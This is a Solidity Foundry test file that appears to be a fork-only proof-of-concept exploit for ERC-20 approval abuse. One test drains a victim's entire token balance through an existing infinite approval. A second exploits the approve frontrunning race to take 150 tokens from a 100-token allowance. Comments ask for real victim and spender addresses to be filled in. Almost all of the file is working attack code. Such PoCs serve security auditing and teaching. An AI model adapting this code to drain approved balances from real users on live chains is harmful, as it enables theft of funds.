// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Approval abuse (infinite approval + approve race)
/// @notice (a) Infinite approval: a victim approved a spender for
///         type(uint).max. The spender can drain the victim's ENTIRE
///         balance at any time.
///         (b) Approve race (ERC-20): victim approved 100, then submits a
///             tx to change it to 50. The spender frontruns the change
///             (spends 100), lets the change land, then spends 50 more --
///             150 total from a 100 approval.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set TOKEN / VICTIM / SPENDER to
///      real addresses on this fork (the victim's approval must exist
///      on-chain for the PoC to run).

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: real token / victim / spender on this fork.
    address public constant TOKEN = address(0);
    address public constant VICTIM = address(0);
    address public constant SPENDER = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_infiniteApprovalDrain() public {
        require(TOKEN != address(0) && VICTIM != address(0) && SPENDER != address(0), "set TOKEN / VICTIM / SPENDER");

        address attackerEOA = makeAddr("attacker");
        uint256 allowance = IERC20(TOKEN).allowance(VICTIM, SPENDER);
        uint256 victimBal = IERC20(TOKEN).balanceOf(VICTIM);
        console.log("allowance:", allowance);
        console.log("victim balance:", victimBal);
        require(allowance >= victimBal, "allowance does not cover the victim balance");

        vm.prank(SPENDER);
        bool ok = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, victimBal);
        require(ok, "transferFrom failed");
        uint256 taken = IERC20(TOKEN).balanceOf(attackerEOA);
        console.log("drained via infinite approval:", taken);
        assertEq(taken, victimBal, "exploit did not reproduce: full balance not drained");

    }

    function test_approveRace() public {
        require(TOKEN != address(0) && VICTIM != address(0) && SPENDER != address(0), "set TOKEN / VICTIM / SPENDER");

        address attackerEOA = makeAddr("attacker");

        // Victim approved 100; spender frontruns the change to 50.
        vm.prank(SPENDER);
        bool ok1 = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, 100);
        require(ok1, "first transferFrom failed -- set a victim with >= 100 allowance");

        // Victim's change lands: approval is now 50.
        vm.prank(VICTIM);
        bool okApprove = IERC20(TOKEN).approve(SPENDER, 50);
        require(okApprove, "approve change failed");

        // Spender spends the "new" 50 too -- 150 total from a 100 approval.
        vm.prank(SPENDER);
        bool ok2 = IERC20(TOKEN).transferFrom(VICTIM, attackerEOA, 50);
        require(ok2, "second transferFrom failed");
        uint256 taken = IERC20(TOKEN).balanceOf(attackerEOA);
        console.log("taken via approve race:", taken);
        assertEq(taken, 150, "exploit did not reproduce: race did not yield 150");

    }
}
